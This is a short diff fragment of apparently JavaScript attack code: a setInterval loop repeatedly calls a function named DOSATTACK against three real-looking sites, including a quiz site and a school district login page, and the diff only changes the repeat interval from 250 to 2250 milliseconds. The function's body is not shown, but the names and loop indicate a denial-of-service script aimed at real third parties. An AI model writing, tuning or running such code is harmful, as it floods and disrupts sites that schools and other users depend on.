@@ -22,5 +22,5 @@ setInterval(function(){
   DOSATTACK("https://lizardpoint.com");
   DOSATTACK("jihadology.net/geography/africa-quiz.php");
   DOSATTACK("ls-child.mvcsc.k12.in.us/login");
-}, 250);
+}, 2250);
 
